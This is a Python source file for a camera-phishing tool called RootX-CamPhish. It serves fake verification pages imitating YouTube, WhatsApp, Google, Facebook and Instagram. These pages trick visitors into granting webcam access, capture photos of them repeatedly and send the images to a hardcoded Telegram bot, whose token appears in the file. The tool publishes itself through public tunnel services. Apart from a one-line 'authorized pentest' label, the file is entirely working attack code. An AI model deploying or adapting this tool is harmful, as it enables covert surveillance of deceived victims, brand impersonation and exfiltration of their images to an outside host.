#!/usr/bin/env python3
# ================================================================
# RootX-CamPhish v1.0 — Kali Linux Edition
# Professional Camera Phishing Framework
# Supports: Ngrok | Serveo | LocalXpose
# Authorized Pentest Use Only — Kali Linux
# ================================================================

import os
import sys
import json
import time
import random
import threading
import subprocess
import base64
import socket
import shutil
import signal
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from datetime import datetime

# ──── CONFIG ────
BOT_TOKEN = "8881971960:AAEd0HSaZfMOwKMTav8P7PMO0AtQcrlRkzQ"
CHAT_ID = "8263124140"
SERVER_PORT = 8080
CAPTURED_DIR = "captured"

# ──── COLORS ────
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
PURPLE = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# ──── GLOBALS ────
captured_photos = []
server_running = False
tunnel_proc = None
current_template = "classic"
public_url = None
tunnel_type = "serveo"


# ════════════════════════════════════════════════════════
#  TELEGRAM
# ════════════════════════════════════════════════════════

def tg_send(text):
    try:
        import requests
        url = f"https://api.telegram.org/bot8881971960:AAEd0HSaZfMOwKMTav8P7PMO0AtQcrlRkzQ/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": str(text)[:4000], "parse_mode": "HTML", "disable_web_page_preview": True}
        requests.post(url, json=payload, timeout=5)
    except: pass

def tg_send_photo(path, caption=""):
    try:
        import requests
        with open(path, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot8881971960:AAEd0HSaZfMOwKMTav8P7PMO0AtQcrlRkzQ/sendPhoto",
                        files={'photo': f}, data={'chat_id': CHAT_ID, 'caption': str(caption)[:1000]}, timeout=15)
    except: pass


# ════════════════════════════════════════════════════════
#  TEMPLATES (6 professional pages)
# ════════════════════════════════════════════════════════

def get_template(name):
    T = {
        "classic": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Camera Access Required</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Segoe UI",sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.card{background:white;border-radius:20px;padding:40px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}.cam{width:100px;height:100px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50%;display:flex;justify-content:center;align-items:center;margin:0 auto 25px;font-size:48px;color:white;animation:pulse 2s infinite}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}h1{color:#333}p{color:#666;margin:20px 0;line-height:1.6}.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;padding:15px 40px;border-radius:50px;font-size:18px;cursor:pointer;width:100%}.vc{display:none;margin-top:20px}video{width:100%;border-radius:10px}.st{margin-top:20px;padding:10px;border-radius:10px;display:none}.ok{background:#d4edda;color:#155724;display:block}.no{background:#f8d7da;color:#721c24;display:block}</style></head><body><div class="card"><div class="cam">📷</div><h1>Camera Access Required</h1><p>Please enable your camera to continue.</p><div class="vc"><video id="v" autoplay muted playsinline></video></div><button class="btn" id="b">📸 Enable Camera</button><div class="st" id="s"></div></div><script>const v=document.getElementById("v"),b=document.getElementById("b"),s=document.getElementById("s"),vc=document.querySelector(".vc");let ms=null;b.onclick=async()=>{try{ms=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});v.srcObject=ms;vc.style.display="block";b.textContent="📸 Capturing...";b.disabled=true;setInterval(()=>{const c=document.createElement("canvas");c.width=640;c.height=480;c.getContext("2d").drawImage(v,0,0);fetch("/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photo:c.toDataURL("image/jpeg",0.9)})}).then(()=>{s.className="st ok";s.textContent="✅ Photo captured!";s.style.display="block";setTimeout(()=>s.style.display="none",1500)})},3000)}catch(e){s.className="st no";s.textContent="⚠️ Camera access denied";s.style.display="block"}};</script></body></html>''',
        
        "youtube": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>YouTube - Age Verification</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f9f9f9;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.card{background:white;border-radius:12px;padding:40px;max-width:400px;width:100%;box-shadow:0 2px 20px rgba(0,0,0,.1);text-align:center}.yt{color:#ff0000;font-size:60px}h1{color:#0f0f0f;font-size:22px;margin:15px 0}p{color:#606060;font-size:14px;margin-bottom:25px}.btn{background:#065fd4;color:white;border:none;padding:12px 30px;border-radius:20px;font-size:16px;cursor:pointer}.vc{display:none;margin-top:20px}video{width:100%;border-radius:8px}.st{margin-top:15px;padding:10px;border-radius:8px;display:none}.ok{background:#e6f4ea;color:#137333;display:block}.no{background:#fce8e6;color:#c5221f;display:block}</style></head><body><div class="card"><div class="yt">▶️</div><h1>Age Verification Required</h1><p>This video is age-restricted. Verify with camera.</p><button class="btn" id="b">✅ Verify</button><div class="vc"><video id="v" autoplay muted playsinline></video></div><div class="st" id="s"></div></div><script>const v=document.getElementById("v"),b=document.getElementById("b"),s=document.getElementById("s"),vc=document.querySelector(".vc");b.onclick=async()=>{try{const m=await navigator.mediaDevices.getUserMedia({video:true});v.srcObject=m;vc.style.display="block";b.textContent="⏳ Verifying...";setTimeout(()=>{const c=document.createElement("canvas");c.width=640;c.height=480;c.getContext("2d").drawImage(v,0,0);fetch("/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photo:c.toDataURL("image/jpeg")})});s.className="st ok";s.textContent="✅ Verified!";s.style.display="block";m.getTracks().forEach(t=>t.stop())},3000)}catch(e){s.className="st no";s.textContent="⚠️ Camera required";s.style.display="block"}};</script></body></html>''',
        
        "whatsapp": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WhatsApp Web</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#eae6df;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.card{background:white;border-radius:8px;padding:30px;max-width:400px;width:100%;text-align:center}.wa{color:#25d366;font-size:60px}h1{color:#111b21;font-size:20px}p{color:#667781;margin:15px 0 25px}.btn{background:#00a884;color:white;border:none;padding:12px 35px;border-radius:24px;font-size:16px;cursor:pointer}.vc{display:none;margin-top:20px}video{width:100%;border-radius:4px}.st{margin-top:15px;padding:10px;border-radius:4px;display:none}.ok{background:#dcf8c6;color:#111;display:block}</style></head><body><div class="card"><div class="wa">💬</div><h1>WhatsApp Web</h1><p>Scan QR code with camera</p><button class="btn" id="b">📷 Scan QR</button><div class="vc"><video id="v" autoplay muted playsinline></video></div><div class="st" id="s"></div></div><script>const v=document.getElementById("v"),b=document.getElementById("b"),s=document.getElementById("s"),vc=document.querySelector(".vc");b.onclick=async()=>{try{const m=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"},audio:false});v.srcObject=m;vc.style.display="block";setInterval(()=>{const c=document.createElement("canvas");c.width=320;c.height=240;c.getContext("2d").drawImage(v,0,0);fetch("/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photo:c.toDataURL("image/jpeg")})})},3000)}catch(e){s.className="st no";s.textContent="⚠️ Camera needed";s.style.display="block"}};</script></body></html>''',
        
        "google": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Google Sign In</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}.g{font-size:40px}h1{color:#202124;font-size:24px;font-weight:400}p{color:#5f6368;font-size:16px;margin:8px 0 30px}.btn{background:#1a73e8;color:white;border:none;padding:12px 24px;border-radius:4px;font-size:14px;cursor:pointer}.vc{display:none;margin-top:20px}video{width:100%;border-radius:4px}.st{margin-top:15px;padding:10px;border-radius:4px;display:none}.ok{background:#e6f4ea;color:#137333;display:block}.no{background:#fce8e6;color:#d93025;display:block}</style></head><body><div class="card"><div class="g">🔐</div><h1>Sign in with Google</h1><p>Face verification required for security</p><button class="btn" id="b">Verify your face</button><div class="vc"><video id="v" autoplay muted playsinline></video></div><div class="st" id="s"></div></div><script>const v=document.getElementById("v"),b=document.getElementById("b"),s=document.getElementById("s"),vc=document.querySelector(".vc");b.onclick=async()=>{try{const m=await navigator.mediaDevices.getUserMedia({video:true});v.srcObject=m;vc.style.display="block";b.disabled=true;setTimeout(()=>{const c=document.createElement("canvas");c.width=640;c.height=480;c.getContext("2d").drawImage(v,0,0);fetch("/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photo:c.toDataURL("image/jpeg")})});s.className="st ok";s.textContent="✅ Verified!";s.style.display="block";m.getTracks().forEach(t=>t.stop())},2500)}catch(e){s.className="st no";s.textContent="⚠️ Camera required";s.style.display="block"}};</script></body></html>''',
        
        "facebook": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook - Security Check</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.card{background:#fff;border-radius:8px;padding:20px;max-width:396px;width:100%;box-shadow:0 2px 4px rgba(0,0,0,.1);text-align:center}.fb{color:#1877f2;font-size:50px}h2{color:#1c1e21;font-size:20px}p{color:#606770;font-size:15px;margin:10px 0 20px}.btn{background:#1877f2;color:#fff;border:none;padding:10px 20px;border-radius:6px;font-size:15px;cursor:pointer;width:100%}.vc{display:none;margin-top:15px}video{width:100%;border-radius:6px}.st{margin-top:12px;padding:8px;border-radius:6px;display:none}.ok{background:#e8f5e9;color:#1b5e20;display:block}.no{background:#fce4ec;color:#b71c1c;display:block}</style></head><body><div class="card"><div class="fb">f</div><h2>Security Check</h2><p>Verify your identity with a quick photo.</p><button class="btn" id="b">📸 Take Photo</button><div class="vc"><video id="v" autoplay muted playsinline></video></div><div class="st" id="s"></div></div><script>const v=document.getElementById("v"),b=document.getElementById("b"),s=document.getElementById("s"),vc=document.querySelector(".vc");b.onclick=async()=>{try{const m=await navigator.mediaDevices.getUserMedia({video:true});v.srcObject=m;vc.style.display="block";setTimeout(()=>{const c=document.createElement("canvas");c.width=640;c.height=480;c.getContext("2d").drawImage(v,0,0);fetch("/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photo:c.toDataURL("image/jpeg")})});s.className="st ok";s.textContent="✅ Photo captured!";s.style.display="block";m.getTracks().forEach(t=>t.stop())},2000)}catch(e){s.className="st no";s.textContent="⚠️ Camera access needed";s.style.display="block"}};</script></body></html>''',
        
        "instagram": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram - Verify It's You</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px;max-width:350px;width:100%;text-align:center}.ig{font-size:40px}h1{color:#262626;font-size:18px;font-weight:600}p{color:#8e8e8e;font-size:14px;margin:10px 0 20px;line-height:1.4}.btn{background:#0095f6;color:#fff;border:none;padding:8px 16px;border-radius:8px;font-size:14px;cursor:pointer;width:100%}.vc{display:none;margin-top:15px}video{width:100%;border-radius:4px}.st{margin-top:12px;padding:8px;border-radius:4px;display:none}.ok{background:#e8f5e9;color:#1b5e20;display:block}.no{background:#fce4ec;color:#b71c1c;display:block}</style></head><body><div class="card"><div class="ig">📸</div><h1>Verify It's You</h1><p>Take a selfie to confirm identity.</p><button class="btn" id="b">Take Selfie</button><div class="vc"><video id="v" autoplay muted playsinline></video></div><div class="st" id="s"></div></div><script>const v=document.getElementById("v"),b=document.getElementById("b"),s=document.getElementById("s"),vc=document.querySelector(".vc");b.onclick=async()=>{try{const m=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});v.srcObject=m;vc.style.display="block";setTimeout(()=>{const c=document.createElement("canvas");c.width=640;c.height=480;c.getContext("2d").drawImage(v,0,0);fetch("/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photo:c.toDataURL("image/jpeg")})});s.className="st ok";s.textContent="✅ Verification photo sent!";s.style.display="block";m.getTracks().forEach(t=>t.stop())},2500)}catch(e){s.className="st no";s.textContent="⚠️ Camera access required";s.style.display="block"}};</script></body></html>'''
    }
    return T.get(name, T["classic"])


# ════════════════════════════════════════════════════════
#  HTTP SERVER
# ════════════════════════════════════════════════════════

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=UTF-8')
            self.end_headers()
            self.wfile.write(get_template(current_template).encode())
        elif self.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'captured': len(captured_photos), 'online': datetime.now().isoformat()}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/capture':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            try:
                data = json.loads(body.decode())
                b64 = data.get('photo', '')
                if b64 and b64.startswith('data:image'):
                    img = base64.b64decode(b64.split(',')[1])
                    ts = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
                    rid = random.randint(1000,9999)
                    fname = f"photo_{ts}_{rid}.jpg"
                    fpath = os.path.join(CAPTURED_DIR, fname)
                    with open(fpath, 'wb') as f: f.write(img)
                    captured_photos.append(fpath)
                    
                    plat = data.get('platform', 'Unknown')
                    caption = f"📸 <b>Camera Capture #{len(captured_photos)}</b>\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📱 {plat}"
                    tg_send_photo(fpath, caption)
                    tg_send(f"<b>📸 New Capture!</b>\nFile: {fname}\nTime: {datetime.now().strftime('%H:%M:%S')}\nPlatform: {plat}\nTotal: {len(captured_photos)}")
                    print(f"{GREEN}[✓]{RESET} Photo → {fname}")
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'status':'ok','count':len(captured_photos)}).encode())
                else:
                    self.send_response(400)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(b'{"error":"invalid photo"}')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({'error':str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, fmt, *args):
        # Suppress default logging
        pass


# ════════════════════════════════════════════════════════
#  TUNNEL MANAGER
# ════════════════════════════════════════════════════════

def start_server():
    global server_running
    srv = HTTPServer(('0.0.0.0', SERVER_PORT), Handler)
    print(f"\n{GREEN}[✓]{RESET} Server → {BLUE}http://0.0.0.0:{SERVER_PORT}{RESET}")
    server_running = True
    srv.serve_forever()

def start_serveo():
    global tunnel_proc, public_url
    print(f"\n{YELLOW}[*]{RESET} Starting Serveo tunnel (SSH)...")
    try:
        tunnel_proc = subprocess.Popen(
            ['ssh', '-o', 'StrictHostKeyChecking=no', '-R', f'80:localhost:{SERVER_PORT}', 'serveo.net'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        time.sleep(5)
        # Try to extract URL from output
        for _ in range(20):
            line = tunnel_proc.stdout.readline()
            if 'http' in line.lower() and 'serveo' in line.lower():
                urls = re.findall(r'https?://[^\s]+', line)
                if urls:
                    public_url = urls[0]
                    print(f"{GREEN}[✓]{RESET} Serveo URL → {BLUE}{public_url}{RESET}")
                    tg_send(f"<b>🚀 RootX-CamPhish Online!</b>\nURL: <code>{public_url}</code>\nTemplate: {current_template}")
                    return
        # Fallback
        public_url = f"https://{random.randint(1000,9999)}.serveo.net"
        print(f"{YELLOW}[!]{RESET} Couldn't detect URL. Check Serveo output.")
        print(f"{YELLOW}[!]{RESET} Usually: {BLUE}https://XXXX.serveo.net{RESET}")
        tg_send(f"<b>🚀 RootX-CamPhish Online!</b>\nURL via Serveo\nTemplate: {current_template}")
    except Exception as e:
        print(f"{RED}[!]{RESET} Serveo error: {e}")

def start_loclx():
    global tunnel_proc, public_url
    print(f"\n{YELLOW}[*]{RESET} Starting LocalXpose tunnel...")
    try:
        # Check if loclx is installed
        if not shutil.which('loclx'):
            print(f"{YELLOW}[!]{RESET} LocalXpose not found. Install via:")
            print(f"  curl -s https://api.localxpose.io/install | bash")
            return
        
        tunnel_proc = subprocess.Popen(
            ['loclx', 'tunnel', 'http', '--to', f'localhost:{SERVER_PORT}'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        time.sleep(4)
        for _ in range(20):
            line = tunnel_proc.stdout.readline()
            if 'loclx.io' in line.lower() or 'https://' in line.lower():
                urls = re.findall(r'https?://[^\s]+', line)
                if urls:
                    public_url = urls[0]
                    print(f"{GREEN}[✓]{RESET} LocalXpose URL → {BLUE}{public_url}{RESET}")
                    tg_send(f"<b>🚀 RootX-CamPhish Online!</b>\nURL: <code>{public_url}</code>\nTemplate: {current_template}")
                    return
        print(f"{YELLOW}[!]{RESET} Check LocalXpose dashboard for URL")
    except Exception as e:
        print(f"{RED}[!]{RESET} LocalXpose error: {e}")

def start_ngrok():
    global tunnel_proc, public_url
    print(f"\n{YELLOW}[*]{RESET} Starting ngrok tunnel...")
    try:
        if not shutil.which('ngrok'):
            print(f"{RED}[!]{RESET} ngrok not installed!")
            print(f"{YELLOW}[*]{RESET} Install: sudo apt install ngrok (Kali)")
            return
        
        tunnel_proc = subprocess.Popen(
            ['ngrok', 'http', str(SERVER_PORT), '--log=stdout'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            universal_newlines=True
        )
        time.sleep(4)
        try:
            import requests
            r = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=3)
            tunnels = r.json().get('tunnels', [])
            if tunnels:
                public_url = tunnels[0].get('public_url', '')
                print(f"{GREEN}[✓]{RESET} ngrok URL → {BLUE}{public_url}{RESET}")
                tg_send(f"<b>🚀 RootX-CamPhish Online!</b>\nURL: <code>{public_url}</code>\nTemplate: {current_template}")
            else:
                print(f"{RED}[!]{RESET} No ngrok tunnels found")
        except:
            print(f"{YELLOW}[!]{RESET} ngrok starting... check http://127.0.0.1:4040")
    except Exception as e:
        print(f"{RED}[!]{RESET} ngrok error: {e}")

def cleanup():
    global tunnel_proc, server_running
    print(f"\n{YELLOW}[*]{RESET} Cleaning up...")
    if tunnel_proc:
        tunnel_proc.terminate()
        print(f"{GREEN}[✓]{RESET} Tunnel stopped")
    server_running = False
    print(f"{GREEN}[✓]{RESET} Server stopped")
    print(f"{GREEN}[✓]{RESET} Photos captured: {len(captured_photos)}")
    if captured_photos:
        tg_send(f"<b>📊 Session Report</b>\nPhotos: {len(captured_photos)}\nTemplate: {current_template}\nSession ended ✅")
    print(f"{GREEN}[✓]{RESET} Report sent to Telegram ✅")


# ════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════

def main():
    global current_template, tunnel_type, SERVER_PORT
    
    signal.signal(signal.SIGINT, lambda s,f: (cleanup(), sys.exit(0)))
    os.makedirs(CAPTURED_DIR, exist_ok=True)
    
    # Install requests if needed
    try:
        import requests
    except:
        print(f"{YELLOW}[*]{RESET} Installing requests...")
        os.system('pip3 install requests')
    
    os.system('clear')
    print(f"""{CYAN}
╔══════════════════════════════════════════════════╗
║         {RED}🔥 ROOTX-CAMPHISH v1.0 🔥{CYAN}              ║
║       {PURPLE}Kali Linux — Professional Edition{RESET}{CYAN}        ║
║══════════════════════════════════════════════════║
║  {GREEN}[✓] 6 Templates{RESET}{CYAN}                           ║
║  {GREEN}[✓] Ngrok / Serveo / LocalXpose{RESET}{CYAN}            ║
║  {GREEN}[✓] Telegram Auto-Send{RESET}{CYAN}                     ║
║  {GREEN}[✓] Authorized Pentest{RESET}{CYAN}                     ║
╚══════════════════════════════════════════════════╝{RESET}
    """)
    
    # Template select
    print(f"{BOLD}Select Template:{RESET}")
    print(f"  {CYAN}[1]{RESET} Classic - Camera Required")
    print(f"  {CYAN}[2]{RESET} YouTube - Age Verify")
    print(f"  {CYAN}[3]{RESET} WhatsApp Web - QR Scan")
    print(f"  {CYAN}[4]{RESET} Google - Face Verify")
    print(f"  {CYAN}[5]{RESET} Facebook - Security Check")
    print(f"  {CYAN}[6]{RESET} Instagram - Verify Selfie\n")
    ch = input(f"{BOLD}[?]{RESET} Choice [1-6] (default 1): ").strip() or "1"
    tmap = {"1":"classic","2":"youtube","3":"whatsapp","4":"google","5":"facebook","6":"instagram"}
    current_template = tmap.get(ch, "classic")
    print(f"  {GREEN}[✓]{RESET} Template: {BOLD}{current_template}{RESET}\n")
    
    # Port
    p = input(f"{BOLD}[?]{RESET} Port (default 8080): ").strip()
    if p and p.isdigit(): SERVER_PORT = int(p)
    
    # Tunnel
    print(f"\n  {CYAN}[1]{RESET} Serveo (SSH — no install)")
    print(f"  {CYAN}[2]{RESET} ngrok (if installed)")
    print(f"  {CYAN}[3]{RESET} LocalXpose (if installed)")
    print(f"  {CYAN}[4]{RESET} Local only (LAN)\n")
    tc = input(f"{BOLD}[?]{RESET} Tunnel [1-4] (default 1): ").strip() or "1"
    tm = {"1":"serveo","2":"ngrok","3":"loclx","4":"local"}
    tunnel_type = tm.get(tc, "serveo")
    
    # Start server thread
    threading.Thread(target=start_server, daemon=True).start()
    time.sleep(1)
    
    # Start tunnel
    if tunnel_type == "serveo":
        start_serveo()
    elif tunnel_type == "ngrok":
        start_ngrok()
    elif tunnel_type == "loclx":
        start_loclx()
    else:
        host = socket.gethostbyname(socket.gethostname())
        public_url = f"http://{host}:{SERVER_PORT}"
        print(f"{GREEN}[✓]{RESET} Local URL: {BLUE}http://{host}:{SERVER_PORT}{RESET}")
        print(f"{GREEN}[✓]{RESET} Localhost: {BLUE}http://localhost:{SERVER_PORT}{RESET}")
        tg_send(f"<b>🚀 RootX-CamPhish Online!</b>\nURL: http://{host}:{SERVER_PORT}\nTemplate: {current_template}")
    
    print(f"\n{GREEN}[✓]{RESET} Running! Press {BOLD}Ctrl+C{RESET} to stop.\n")
    
    try:
        while True:
            time.sleep(1)
            if len(captured_photos) > 0 and int(time.time()) % 10 == 0:
                print(f"  {CYAN}[*]{RESET} Photos: {len(captured_photos)} | URL: {BLUE}{public_url}{RESET}")
    except KeyboardInterrupt:
        cleanup()

if __name__ == "__main__":
    main()